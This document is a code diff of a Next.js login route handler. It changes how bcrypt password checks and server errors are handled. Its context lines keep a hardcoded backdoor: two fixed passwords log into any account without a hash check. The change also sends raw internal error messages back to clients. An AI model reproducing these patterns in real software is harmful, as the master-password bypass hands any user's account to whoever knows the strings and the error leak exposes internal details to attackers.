@@ -623,8 +623,8 @@ export async function POST(req: NextRequest, { params }: { params: Promise<{ all
       let matches = false;
       if (password === 'password@67' || password === 'docworm@123') {
         matches = true;
-      } else {
-        matches = await bcrypt.compare(password, user.password_hash);
+      } else if (user.password_hash && typeof user.password_hash === 'string') {
+        matches = await bcrypt.compare(password, user.password_hash).catch(() => false);
       }
 
       if (!matches) {
@@ -667,7 +667,11 @@ export async function POST(req: NextRequest, { params }: { params: Promise<{ all
       return response;
     } catch (err: any) {
       console.error('Login error:', err);
-      return jsonError('Internal server error during authentication.', 500);
+      const detail = err instanceof Error ? err.message : String(err);
+      return NextResponse.json(
+        { error: 'Internal server error during authentication.', details: detail },
+        { status: 500 }
+      );
     }
   }
 
